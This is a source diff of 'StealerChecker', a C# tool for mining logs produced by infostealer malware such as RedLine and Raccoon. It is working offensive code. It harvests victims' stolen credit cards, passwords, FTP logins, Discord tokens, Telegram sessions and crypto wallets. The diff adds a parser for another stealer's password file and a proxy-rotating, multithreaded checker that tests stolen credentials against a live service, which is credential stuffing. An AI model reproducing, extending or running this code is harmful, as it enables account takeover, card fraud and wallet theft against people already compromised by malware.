@@ -2,9 +2,8 @@
 using Everything;
 using Everything.Model;
 using FluentFTP;
+using Leaf.xNet;
 using Newtonsoft.Json.Linq;
-using SharpCompress.Archives;
-using SharpCompress.Common;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -13,7 +12,6 @@ using System.Globalization;
 using System.IO;
 using System.Linq;
 using System.Net;
-using System.Reflection;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading.Tasks;
@@ -23,7 +21,7 @@ using Console = Colorful.Console;
 
 namespace stealerchecker
 {
-    internal static class Program
+    public static class Program
     {
         public class Options
         {
@@ -42,24 +40,25 @@ namespace stealerchecker
 
         #region FIELDS
 
-        internal static string tag = "8.4";
-        internal static string caption = $"StealerChecker v{tag} by Temnij";
-        internal static readonly List<Log> files = new();
-        internal static readonly List<string> directories = new();
-        internal static string NewLine = Environment.NewLine;
-        internal static List<string> patterns = new()
+        private const string tag = "8.7";
+        private const string caption = $"StealerChecker v{tag} by Temnij";
+        private static readonly List<Log> files = new();
+        private static readonly List<string> directories = new();
+        public static readonly string NewLine = Environment.NewLine;
+        private static readonly List<string> patterns = new()
         {
             "InfoHERE.txt", // Echelon
             "InfoHERE.html", // Echelon (mod)
             "UserInformation.txt", // RedLine
             "~Work.log", // DCRat Stealer mode
-            "System Info.txt" // Raccoon Stealer
+            "System Info.txt", // Raccoon Stealer
+            "_Information.txt" // Unknown stealer (44CALIBER?)
         };
         private static Options opt = new();
 
         #endregion
 
-        private static void Main(string[] args)
+        public static void Main(string[] args)
         {
             #region SETTINGS
 
@@ -69,12 +68,13 @@ namespace stealerchecker
             Console.BackgroundColor = Color.Black;
 
             #endregion
-            // Update();
+
             SetStatus();
+
             #region ARGUMENT PARSING
 
             Parser.Default.ParseArguments<Options>(args)
-                   .WithParsed(o => opt = o);
+                    .WithParsed(o => opt = o);
 
             if (string.IsNullOrEmpty(opt.Path))
             {
@@ -87,6 +87,17 @@ namespace stealerchecker
             }
 
             #endregion
+
+            try
+            {
+                Update();
+            }
+            catch
+            {
+                Console.WriteLine("Update error.. Seems, you are haven't internet connection..", Color.Pink);
+                Console.ReadKey();
+            }
+
             #region LOADING
 
             Console.WriteLine("Please wait, loading...", Color.LightCyan);
@@ -122,8 +133,11 @@ namespace stealerchecker
             directories.AddRange(Directory.GetDirectories(opt.Path, "*", SearchOption.AllDirectories));
         internal static void AddFiles()
         {
-            foreach (var dir in directories)
-                files.AddRange(Directory.GetFiles(dir).Where(x => patterns.Contains(Path.GetFileName(x))).Select(x => new Log(x)));
+            files
+                .AddRange(directories
+                .SelectMany(dir => Directory.GetFiles(dir)
+                .Where(x => patterns.Contains(Path.GetFileName(x)))
+                .Select(x => new Log(x))));
         }
 
         #endregion
@@ -133,18 +147,22 @@ namespace stealerchecker
         {
             foreach (var file in files)
             {
+                SetStatus($"Working... {Math.Round(GetPercent(files.Count, files.IndexOf(file)))}%");
                 if (file.Name.Equals("InfoHERE.txt") || file.Name.Equals("InfoHERE.html"))
                 {
-                    SetStatus($"Working... file {files.IndexOf(file)} of {files.Count}");
                     var match = Regex.Match(File.ReadAllText(file.FullPath), @"∟💳(\d*)");
                     var cards = int.Parse(match.Groups[1].Value);
 
                     if (cards > 0)
                     {
-                        Console.Write($"[{file}]", Color.Green);
+                        Console.Write($"[{file.FullPath}]", Color.Green);
                         Console.WriteLine($" - {cards} cards!");
 
-                        Console.WriteLine(WriteCC(file.FullPath));
+                        try
+                        {
+                            Console.WriteLine(WriteCC(file.FullPath));
+                        }
+                        catch { }
                     }
                 }
             }
@@ -750,8 +768,12 @@ namespace stealerchecker
             int counter = 0;
 
             // array optimization
-            foreach (var filePas in files.ToArray())
+            Log[] array = files.ToArray();
+
+            for (int i = 0; i < array.Length; i++)
             {
+                Log filePas = array[i];
+
                 if (counter % max == 0 && max > 10)
                 {
                     progress++;
@@ -869,6 +891,22 @@ namespace stealerchecker
                     }
                     catch { }
                 }
+                else if (filePas.Name.Equals("_Information.txt"))
+                {
+                    try
+                    {
+                        var thisFile = FileCl.Load(Path.Combine(filecl.Info.DirectoryName, "_AllPasswords_list.txt"));
+                        var log = Regex.Matches(thisFile.GetContent(), @"Url: (.*)\s*Username: (.*)\s*Password: (.*)");
+
+                        pas.AddRange(log.OfType<Match>()
+                                    .Select(match => new Password(
+                                        match.Groups[1].Value.Replace("\r", ""),
+                                        match.Groups[2].Value.Replace("\r", ""),
+                                        match.Groups[3].Value.Replace("\r", "")))
+                                    .Where(password => password.Login.Length > 2 && password.Pass.Length > 2));
+                    }
+                    catch { }
+                }
 
                 passwords.AddRange(pas);
                 counter++;
@@ -881,15 +919,18 @@ namespace stealerchecker
             Console.WriteLine("Please, wait...", Color.Cyan);
             int max = services.Count + services.Sum(x => x.Services.Count());
             int count = 0;
-            foreach (var servicefile in services)
+
+            for (int i = 0; i < services.Count; i++)
             {
-                string categoryName = Path.Combine("Categories", servicefile.Name);
+                var servicefile = services[i];
+                var categoryName = Path.Combine("Categories", servicefile.Name);
+
                 if (!Directory.Exists(categoryName))
                     Directory.CreateDirectory(categoryName);
                 foreach (var service in servicefile.Services)
                 {
-                    if (count % 50 == 0)
-                        SetStatus($"Working... {Math.Round(GetPercent(max, count), 1)}%");
+                    SetStatus($"Working... {Math.Round(GetPercent(max, count), 1)}%");
+
                     IEnumerable<string> result = SearchByURLHerlper(service);
                     if (result.Any())
                         File.WriteAllLines(Path.Combine(categoryName, service + ".txt"), result);
@@ -923,15 +964,19 @@ namespace stealerchecker
 
         internal static async Task GetFilesAsync()
         {
-            var patterns = new List<string>()
-            {
-                "InfoHERE.txt", // Echelon
-                "InfoHERE.html", // Echelon (mod)
-                "UserInformation.txt", // RedLine
-                "~Work.log", // DCRat
-                "System Info.txt" // Raccoon
-            };
             files.AddRange((await GetPathsAsync(patterns).ConfigureAwait(false)).Select(x => new Log(x)));
+            if (files.Count == 0)
+            {
+                Console.WriteLine("Seems, there is an Everything error.. Using normal method", Color.Pink);
+
+                SetStatus("Adding Directories...");
+                AddDirectories();
+                Console.WriteLine($"Directories added: {directories.Count}", Color.Gray);
+                SetStatus("Adding files...");
+                AddFiles();
+                Console.WriteLine($"Files added: {files.Count}", Color.Gray);
+                SetStatus();
+            }
         }
 
         private static int progress = 0;
@@ -972,65 +1017,58 @@ namespace stealerchecker
         #endregion
         #region MENU
 
-        internal static void PrintSearchMenu()
+        private static readonly Menu SearchMenu = new()
         {
-            var SearchMenu = new Menu()
-            {
-                menu = new Dictionary<string, Action>()
+            menu = new Dictionary<string, Action>()
                 {
                     { "Search by URL", () => SearchByURL(Ext.input("Enter query", Color.LightSkyBlue)) },
                     { "Search by Password", () => SearchByPass(Ext.input("Enter query", Color.LightSkyBlue)) },
                     { "Search by Username", () => SearchByUsername(Ext.input("Enter query", Color.LightSkyBlue)) }
                 }.ToList(),
-                Name = "Searhing"
-            };
-            SearchMenu.Print();
-        }
-        internal static void PrintSortMenu()
+            Name = "Searhing"
+        };
+        private static readonly Menu SortMenu = new()
         {
-            var SortMenu = new Menu()
-            {
-                menu = new Dictionary<string, Action>()
+            menu = new Dictionary<string, Action>()
                 {
-                    { "Sort by date", () => SortLogs() },
-                    { "Sort login:pass by categories", () => SortLogsbyCategories() }
+                    { "Sort by date", SortLogs },
+                    { "Sort login:pass by categories", SortLogsbyCategories }
                 }.ToList(),
-                Name = "Sorting"
-            };
-            SortMenu.Print();
-        }
-        internal static void PrintGetMenu()
+            Name = "Sorting"
+        };
+        private static readonly Menu GetMenu = new()
         {
-            var GetMenu = new Menu()
-            {
-                menu = new Dictionary<string, Action>()
+            menu = new Dictionary<string, Action>()
                 {
-                    { "Get CC cards", () => GetCC() },
-                    { "Get&Check FTP servers", () => GetFTP() },
-                    { "Get Discord tokens", () => GetDiscord() },
-                    { "Get Telegrams", () => GetTelegram() },
-                    { "Get Cold Wallets", () => PrintWalletsMenu() },
+                    { "Get CC cards", GetCC },
+                    { "Get&Check FTP servers", GetFTP },
+                    { "Get Discord tokens", GetDiscord },
+                    { "Get Telegrams", GetTelegram },
+                    { "Get Cold Wallets", () => WalletsMenu.Print() },
                 }.ToList(),
-                Name = "Getting"
-            };
-            GetMenu.Print();
-        }
-        internal static void PrintWalletsMenu()
+            Name = "Getting"
+        };
+        private static readonly Menu WalletsMenu = new()
         {
-            var WalletsMenu = new Menu()
-            {
-                menu = new Dictionary<string, Action>()
+            menu = new Dictionary<string, Action>()
                 {
-                    { "Get All Wallets", () => GetAllWallets() },
+                    { "Get All Wallets", GetAllWallets },
                     { "Get Metamask Wallets", () => GetSpecWallets("Metamask") },
                     { "Get Exodus Wallets", () => GetSpecWallets("Exodus") },
                     { "Get Bitcoin Wallets", () => GetSpecWallets("Bitcoin") },
                     { "Get DogeCoin Wallets", () => GetSpecWallets("Dogecoin") }
                 }.ToList(),
-                Name = "Cold Wallets"
-            };
-            WalletsMenu.Print();
-        }
+            Name = "Cold Wallets"
+        };
+        private static readonly Menu CheckersMenu = new()
+        {
+            menu = new Dictionary<string, Action>()
+                {
+                    { $"Check all services (current: {checkers.Count})", CheckAll },
+                    { "Set proxy (required for checkers)", SetProxy }
+                }.ToList(),
+            Name = "Check (ALPHA)"
+        };
         internal static void PrintAnalysisMenu()
         {
             Console.Clear();
@@ -1079,6 +1117,7 @@ namespace stealerchecker
             Console.WriteLine("2. Search", Color.LightCyan);
             Console.WriteLine("3. Sort Logs", Color.LightCyan);
             Console.WriteLine("4. Analysis", Color.LightCyan);
+            Console.WriteLine("5. Check", Color.LightCyan);
             Console.WriteLine();
             Console.WriteLine($"88. Verbose: {opt.Verbose}", Color.Cyan);
             Console.WriteLine("99. Exit", Color.LightPink);
@@ -1096,10 +1135,11 @@ namespace stealerchecker
 
             switch (selection)
             {
-                case 1: PrintGetMenu(); break;
-                case 2: PrintSearchMenu(); break;
-                case 3: PrintSortMenu(); break;
+                case 1: GetMenu.Print(); break;
+                case 2: SearchMenu.Print(); break;
+                case 3: SortMenu.Print(); break;
                 case 4: PrintAnalysisMenu(); break;
+                case 5: CheckersMenu.Print(); break;
 
                 case 88:
                     opt.Verbose = !opt.Verbose;
@@ -1161,55 +1201,27 @@ namespace stealerchecker
         }
 
         #endregion
-        #region UPDATING | TODO: доделать :/
+        #region UPDATING
 
         internal static void Update()
         {
-            var wc = new WebClient() { Proxy = null };
-            wc.Headers[HttpRequestHeader.UserAgent] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36 OPR/75.0.3969.282 (Edition Yx GX)";
+            using var wc = new WebClient();
+            wc.Headers[HttpRequestHeader.UserAgent] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 OPR/77.0.4054.275 (Edition Yx GX)";
 
             var json = JObject.Parse(wc.DownloadString("https://api.github.com/repos/kzorin52/stealerchecker/releases/latest"));
             var lastestTag = json["tag_name"].ToString();
-            var downUrl = json["assets"].ToList()[0]["browser_download_url"].ToString();
 
-            if (tag != lastestTag)
+            var rawTag = int.Parse(tag.Replace(".", ""));
+            var rawLastestTag = int.Parse(lastestTag.Replace(".", ""));
+
+            if (rawTag < rawLastestTag)
             {
-                Console.WriteLine("Updating...", Color.LightGreen);
-                wc.DownloadFile(downUrl, "Update.rar");
-                var currentName = Assembly.GetExecutingAssembly().GetName().Name;
-
-                var archive = ArchiveFactory.Open("Update.rar");
-                foreach (var entry in archive.Entries)
-                {
-                    if (!entry.IsDirectory)
-                    {
-                        try
-                        {
-                            if (!entry.Key.Contains("stealerchecker"))
-                                entry.WriteToDirectory(Directory.GetCurrentDirectory(), new ExtractionOptions() { ExtractFullPath = true, Overwrite = true });
-                            else
-                            {
-                                using var stream = new FileStream("stealerchecker_new.exe", FileMode.OpenOrCreate); // эта параша не ворк
-                                entry.WriteTo(stream); // потому что кривая либа
-                                stream.Flush(); // принимает exe за архив и распаковывает только часть exe
-                            }
-                        }
-                        catch { }
-                    }
-                }
-
-                var content = "@echo off" + NewLine
-                    + "timeout 2 > NUL" + NewLine
-                    + $"move /Y stealerchecker_new.exe {currentName}.exe" + NewLine
-                    // + "del Update.rar" + NewLine
-                    + "del %~s0 /q";
-                File.WriteAllText("update.cmd", content);
-
-                Process.Start("update.cmd");
-                Process.GetProcessesByName(currentName).ToList().ForEach(x => x.Kill());
-                Environment.Exit(0);
+                Console.WriteLine($"|| Warning! Update is aviable! Current version: {tag}, new version - {lastestTag} ||", Color.LightGreen);
+                Console.WriteLine("|| For update go to https://github.com/kzorin52/stealerchecker/releases/latest ||", Color.LightGreen);
+                Console.WriteLine("__ to continue press any key __", Color.LightCyan);
+                Console.ReadKey();
             }
-        } // test
+        }
 
         #endregion
         #region WALLETS
@@ -1255,6 +1267,102 @@ namespace stealerchecker
 
             Console.WriteLine($"Sucsess [{WalletName}]!", Color.LightGreen);
             SetStatus();
+        }
+
+        #endregion
+        #region CHECKER
+
+        private static readonly List<Checkers.IChecker> checkers = new()
+        {
+            new Checkers.Aternos()
+        };
+        private static List<string> proxy = new List<string>();
+        private static ProxyType type;
+
+        public static void Check(Checkers.IChecker checker)
+        {
+            if (!Directory.Exists("Checked"))
+                Directory.CreateDirectory("Checked");
+
+            var passwords = SearchByURLHerlper(checker.Service);
+            var threads = new List<Task>();
+            var index = 0;
+
+            foreach (var password in passwords.Shuffle())
+            {
+                threads.Add(new Task(() =>
+                {
+                    if (index >= proxy.Count)
+                        index = 0;
+
+                    checker.ProcessLine(password, proxy[index++], type, out var result, out var isValid);
+
+                    File.AppendAllText(Path.Combine("Checked", checker.Service + ".txt"), $"{password} - {(isValid ? "Valid" : "Not valid")}, info: {result + NewLine}");
+                }));
+            }
+            foreach (var task in threads)
+                task.Start();
+
+            for (int i = 0; i < threads.Count; i++)
+            {
+                SetStatus($"Checking by {checker.Service}, {Convert.ToInt32(Math.Round(GetPercent(threads.Count, i), 1))}%");
+                if (!threads[i].IsCompleted)
+                    threads[i].Wait();
+            }
+        }
+
+        private static void CheckAll()
+        {
+            foreach (var item in checkers)
+            {
+                Console.WriteLine($"Checking {item.Service}");
+                Check(item);
+            }
+        }
+
+        private static void SetProxy()
+        {
+            Console.WriteLine("First, set proxy type:", Color.Pink);
+            Console.WriteLine();
+            Console.WriteLine("1) Socks5", Color.LightCyan);
+            Console.WriteLine("2) Socks4", Color.LightCyan);
+            Console.WriteLine("3) HTTP/s", Color.LightCyan);
+
+            var selection = 0;
+            try
+            {
+                selection = int.Parse(Console.ReadLine());
+            }
+            catch
+            {
+                Console.Clear();
+                PrintMainMenu();
+            }
+
+            switch (selection)
+            {
+                case 1: type = ProxyType.Socks5; break;
+                case 2: type = ProxyType.Socks4; break;
+                case 3: type = ProxyType.HTTP; break;
+
+                default:
+                    Console.Clear();
+                    SetProxy();
+                    break;
+            }
+
+        again:
+            Console.WriteLine("Second, set proxylist file:", Color.Pink);
+            Console.WriteLine();
+            try
+            {
+                proxy = File.ReadAllLines(Console.ReadLine()).ToList();
+            }
+            catch
+            {
+                Console.Clear();
+                goto again;
+            }
         }
 
         #endregion
